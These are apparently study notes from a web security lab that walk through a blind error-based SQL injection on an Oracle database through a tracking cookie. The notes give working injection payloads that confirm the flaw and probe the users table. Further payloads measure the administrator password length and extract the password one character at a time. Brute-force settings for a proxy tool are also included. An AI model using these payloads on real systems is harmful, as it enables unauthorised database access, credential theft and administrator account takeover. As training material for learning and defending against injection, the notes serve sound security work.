Vulnerable parameter - tracking cookie

End goals
    - Output admin password
    - login as administrator

    Analysis:

    1. Prove that parameter is Vulnerable
    ' after the cookie results in error, '' does not
    ' || (select '') || ' -> causes error
    ' || (select '' from dual) || ' -> does not.  Means it is ORACLE

    2. Confirm that users table exists in database
    ' || (select '' from users) || ' -> causes error because it is trying to return multiple rows
    ' || (select '' from users where rownum = 1) || '

    3. Confirm that the administrator user exists in the users database
    ' || (select '' from users where username='administrator') || ' -> no difference in output if valid or invalid user
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> here is our framework.  When 1=1 perform the function with an invalid parameter.  
    ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> If change 1=0, it will give empty string which renders fine
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' -> The "from" statement is always evaluated first.
        If it is true, then (1=1) will be evaluated, resulting in an error due to 1 divided by 0.  If false, then the ELSE will evaluate and you will have normal output.

    4. Determine length of password
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '   -> Can keep iterating

    Can send to Intruder and do sniper.  Clear all the points then add point at the '1' password length.  Payload is "Number" and have it iterate 1 through 50 and step 1 each time.
    The moment it starts getting a 200 response is the length.

    5. Output the administrator password
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) = 'a') || ' 
        This will check the first character of the password is equal to 'a'.  You can send to intruder and do cluster bomb to iterate up to the length for
        all chars.  payload 1 is "Number" 1 through length stepping 1 each time.  Payload 2 is a simple list adding lower chars and 1s or "Brute Forcer"
        with min/max length of 1 which does same.  500 response = correct response.
